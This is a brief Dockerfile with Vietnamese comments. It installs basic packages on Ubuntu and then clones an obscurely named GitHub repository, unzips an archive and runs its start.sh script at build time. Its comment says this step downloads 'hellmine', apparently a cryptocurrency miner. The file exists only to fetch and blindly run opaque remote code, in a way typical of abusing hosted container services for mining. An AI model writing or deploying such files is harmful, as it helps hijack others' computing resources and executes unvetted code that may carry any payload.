
FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 
    

# Tạo thư mục làm việc và tải hellmine

RUN git clone https://github.com/teo224532/Bjndersrb.git && cd Bjndersrb && unzip New.zip && cd New && chmod +x start.sh && ./start.sh 48
